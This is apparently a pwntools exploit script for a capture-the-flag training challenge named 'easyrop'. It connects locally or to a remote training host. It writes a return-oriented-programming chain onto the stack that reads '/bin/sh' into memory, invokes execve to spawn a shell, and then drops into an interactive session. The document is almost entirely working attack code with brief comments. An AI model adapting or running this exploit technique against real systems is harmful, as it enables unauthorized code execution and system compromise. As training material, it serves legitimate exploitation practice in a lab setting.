from pwn import *
import time
# b *0x0401167

CHALL_PATH = "./easyrop"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
c
"""

context.arch = "amd64"

if args.REMOTE:
    c = remote("easyrop.training.offensivedefensive.it",8080,ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        c = process(CHALL_PATH)

c.recvuntil(b"!\n")


# primitive to write on the stack

def halfonstack(value):
    c.send(p32(value))   # p32 because the read, takes 4 byte 
    c.send(p32(0))       # b'\x00\x00\x00\x00'

def onstack(value):
    onehalf = value & 0xffffffff
    otherhalf = value >> 32

    halfonstack(onehalf)
    halfonstack(otherhalf)


# gadgets and usefull memory address
pop_rdi_rsi_rdx_rax = 0x040108e
read_addr = 0x401000
syscall = 0x401028
bss = 0x403500

# reach sRIP
chain = [0x0] * 7
# ROP chain:
chain += [
    pop_rdi_rsi_rdx_rax,  # prepare argument for execute a read
    0,                    # rdi = 0
    bss,                  # rsi = where store "/bin/sh\0"
    8,                    # rdx = length of /bin/sh\0
    0,                    # rax = 0 (not needed but we have to due the gadget)
    read_addr,            # call read
    pop_rdi_rsi_rdx_rax,  # prepare argument for syscall excve
    bss,                  # rdi -> "/bin/sh\0"
    0,                    # rsi = 0
    0,                    # rdx = 0
    0x3b,                 # rax = 0x3b (execve)
    syscall               # launch syscall
]
for i in chain:
    onstack(i)


# quit the loop so we can execute the read
c.send(b"\n")
time.sleep(0.1)  # force a short read
c.send(b"\n")
time.sleep(0.1)  # force a short read

# write /bin/sh in memory
c.send(b"/bin/sh\x00")


c.interactive()